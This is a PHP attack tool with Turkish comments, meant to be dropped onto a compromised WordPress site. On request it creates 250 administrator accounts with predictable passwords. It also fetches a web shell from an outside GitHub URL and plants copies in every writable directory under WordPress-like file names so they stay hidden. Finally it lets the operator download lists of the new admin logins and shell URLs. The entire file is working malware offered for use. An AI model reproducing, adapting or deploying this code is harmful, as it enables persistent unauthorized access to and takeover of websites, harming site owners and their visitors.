<?php
// WordPress yüklü olduğu dizine gidin ve wp-load.php dosyasını dahil edin.
require_once($_SERVER['DOCUMENT_ROOT'] . '/wp-load.php');

// Ayarlar
define('GITHUB_SHELL_URL', 'https://raw.githubusercontent.com/onurkzn/x/refs/heads/main/s.php');
define('SHELL_EXTENSIONS', ['.php']);
define('EXCLUDE_DIRS', ['/wp-admin', '/wp-includes', '/vendor', '/node_modules', '/.git']);

// Shell dosya adları (WordPress dosyalarına benzeyen isimler)
$shell_filenames = [
    'wp-cache', 'wp-styles', 'wp-scripts', 'wp-temp', 'wp-assets',
    'wp-libs', 'wp-modules', 'wp-plugins', 'wp-core', 'wp-uploads'
];

// Değişkenler
$message = '';
$admin_list = [];
$shell_paths = [];

// Admin Hesap Oluşturma
if (isset($_GET['create_admins'])) {
    $created_admins = 0;
    $base_username = 'admin_';
    $base_email = 'admin_@example.com';
    $base_password = 'Passw0rd!';

    while ($created_admins < 250) {
        $username = $base_username . uniqid();
        $email = $base_email . uniqid() . '@example.com';
        $password = $base_password . rand(100, 999);

        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                $admin_list[] = "Kullanıcı: $username | Şifre: $password";
                $created_admins++;
            }
        }
    }

    $message = "✅ $created_admins adet admin hesabı oluşturuldu!";
}

// GitHub'dan Shell Çekip Tüm Dizinlere Dağıtma
if (isset($_GET['create_shell'])) {
    // Shell içeriğini GitHub'dan çek
    $ch = curl_init(GITHUB_SHELL_URL);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0',
    ]);
    $shell_content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 200 || $shell_content === false) {
        $message = "❌ Shell indirilemedi. GitHub bağlantınızı kontrol edin.";
    } else {
        // Tüm dizinleri tarayalım
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(__DIR__));
        $excluded_dirs = array_map(fn($dir) => __DIR__ . $dir, EXCLUDE_DIRS);

        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $dir = $file->getPathname();

                // Hariç tutulan dizinler hariç diğerlerine shell yerleştir
                if (!in_array($dir, $excluded_dirs) && is_writable($dir)) {
                    // Rastgele bir WordPress benzeri isim oluştur
                    $random_name = $shell_filenames[array_rand($shell_filenames)];
                    $random_suffix = uniqid();
                    $shell_name = "$random_name$random_suffix.php";
                    $shell_path = "$dir/$shell_name";

                    if (file_put_contents($shell_path, $shell_content)) {
                        $shell_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir) . "/$shell_name";
                        $shell_paths[] = "Shell: $shell_name → URL: http://" . $_SERVER['HTTP_HOST'] . '/' . ltrim($shell_url, '/');
                    } else {
                        $shell_paths[] = "HATA: $shell_name → $dir dizinine yazılamadı!";
                    }
                }
            }
        }

        if (!empty($shell_paths)) {
            $message = "✅ Shell dosyaları tüm dizinlere yayıldı!";
        } else {
            $message = "❌ Shell oluşturulamadı. Dizin izinlerini veya bağlantı durumunu kontrol edin.";
        }
    }
}

// TXT Dosyalarını İndirme
if (isset($_GET['download'])) {
    $type = $_GET['download'];
    if ($type === 'admins') {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="admins.txt"');
        echo implode("\n", $admin_list);
        exit;
    } elseif ($type === 'shells') {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="shell_paths.txt"');
        echo implode("\n", $shell_paths);
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin & Shell Oluşturucu</title>
    <style>
        body {
            background: #121212;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 40px;
        }

        a {
            display: inline-block;
            margin: 10px;
            padding: 12px 20px;
            background: #f5a623;
            color: #000;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }

        a:hover {
            background: #ff9500;
        }

        .log {
            margin-top: 30px;
            white-space: pre-wrap;
            background: #222;
            padding: 20px;
            border-radius: 8px;
            max-height: 300px;
            overflow-y: auto;
        }

        .message {
            margin: 20px 0;
            padding: 15px;
            background: #2e7d32;
            border-left: 4px solid #66bb6a;
            color: #e8f5e9;
        }

        .error {
            background: #c62828;
            color: #ffebee;
            border-color: #ef5350;
        }
    </style>
</head>
<body>
    <h1>Admin & Shell Oluşturucu</h1>

    <?php if ($message): ?>
        <div class="message <?= strpos($message, 'başarıyla') !== false ? '' : 'error' ?>"><?= $message ?></div>
    <?php endif; ?>

    <p><a href="?create_admins=1">250 Admin Hesabı Oluştur</a></p>
    <p><a href="?create_shell=1">Tüm Dizinlere Shell Oluştur</a></p>

    <div class="log">
        <?php if (!empty($admin_list)): ?>
            ✅ Oluşturulan Admin'ler:\n
            <?= implode("\n", $admin_list) ?>
        <?php endif; ?>
    </div>

    <div class="log">
        <?php if (!empty($shell_paths)): ?>
            ✅ Oluşturulan Shell Yolları:\n
            <?= implode("\n", $shell_paths) ?>
        <?php endif; ?>
    </div>

    <div class="download-buttons">
        <?php if (!empty($admin_list)): ?>
            <a href="?download=admins">Oluşturulan Admin'leri İndir</a>
        <?php endif; ?>

        <?php if (!empty($shell_paths)): ?>
            <a href="?download=shells">Oluşturulan Shell Yollarını İndir</a>
        <?php endif; ?>
    </div>
</body>
</html>